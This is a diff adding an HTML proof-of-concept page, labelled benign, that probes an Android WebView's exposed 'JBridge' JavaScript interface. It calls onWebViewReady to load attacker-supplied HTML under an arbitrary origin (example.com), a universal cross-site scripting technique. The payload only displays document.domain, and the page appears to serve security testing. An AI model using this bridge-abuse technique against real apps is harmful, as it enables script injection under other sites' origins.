@@ -1,0 +1,34 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>UXSS probe (benign)</title></head>
+<body>
+  <h2>UXSS probe (benign)</h2>
+  <div id="log"></div>
+  <script>
+    function log(s){ const d=document.getElementById('log'); d.appendChild(document.createElement('pre')).textContent = s; console.log(s); }
+    try {
+      log('Probe started: ' + new Date().toISOString());
+      if (typeof window.JBridge === 'undefined') {
+        log('window.JBridge NOT found in this WebView — bridge not registered here.');
+      } else {
+        log('window.JBridge FOUND — attempting UXSS probe via onWebViewReady()');
+
+        // attacker-controlled HTML to be loaded under base origin:
+        const attackerHtml = "<!doctype html><html><body><h1>UXSS TEST</h1><p id='p'></p><script>document.getElementById('p').innerText = 'document.domain='+document.domain;<\/script></body></html>";
+
+        // Try the 4-arg onWebViewReady: (callbackId, baseUrl, htmlContent, mimeFlag)
+        // baseUrl: choose a harmless, well-formed origin to test (example.com)
+        // mimeFlag: pass anything != "base64" (e.g., "text")
+        try {
+          window.JBridge.onWebViewReady("probe_container", "https://example.com", attackerHtml, "text");
+          log('onWebViewReady() invoked — if the app accepts it, a new page should load under https://example.com and display document.domain.');
+        } catch (e) {
+          log('Exception calling onWebViewReady(): ' + e);
+        }
+      }
+    } catch (err) {
+      log('Probe error: ' + err);
+    }
+  </script>
+</body>
+</html>
